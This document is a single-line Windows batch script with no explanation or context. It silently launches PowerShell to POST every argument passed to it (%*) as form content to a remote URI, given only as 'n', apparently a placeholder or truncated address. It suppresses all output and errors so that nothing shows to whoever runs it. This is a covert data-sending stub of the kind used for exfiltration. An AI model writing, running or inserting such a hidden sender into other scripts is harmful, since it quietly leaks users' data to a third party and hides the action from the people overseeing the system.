@(@powershell "$a=@{content='%*'};iwr -uri 'n' -method POST -body $a")>nul 2>&1
